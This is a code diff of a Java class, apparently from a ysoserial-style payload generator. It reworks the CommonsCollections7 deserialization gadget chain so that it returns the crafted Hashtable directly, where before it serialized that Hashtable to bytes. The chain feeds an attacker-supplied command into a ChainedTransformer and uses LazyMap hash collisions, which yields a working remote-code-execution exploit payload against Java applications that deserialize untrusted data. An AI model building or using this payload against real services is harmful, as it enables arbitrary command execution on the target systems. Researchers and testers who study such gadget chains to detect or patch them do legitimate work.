@@ -7,16 +7,13 @@ import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.map.LazyMap;
 
-import java.io.ByteArrayOutputStream;
-import java.io.ObjectOutputStream;
-import java.io.Serializable;
 import java.util.HashMap;
 import java.util.Hashtable;
 import java.util.Map;
 
-public class CommonsCollections7Lite implements ObjectPayload<Serializable>{
+public class CommonsCollections7Lite_4 implements ObjectPayload<Hashtable>{
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Hashtable getObject(PayloadType type, String... param) throws Exception {
         String              command          = param[0];
         final Transformer   transformerChain = new ChainedTransformer(new Transformer[]{});
         final Transformer[] transformers     = (Transformer[]) TransformerUtil.makeTransformer(command);
@@ -40,18 +37,6 @@ public class CommonsCollections7Lite implements ObjectPayload<Serializable>{
         // Needed to ensure hash collision after previous manipulations
         lazyMap2.remove("yy");
 
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(hashtable);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Serializable getObject(String command) throws Exception {
-        return null;
+        return hashtable;
     }
 }
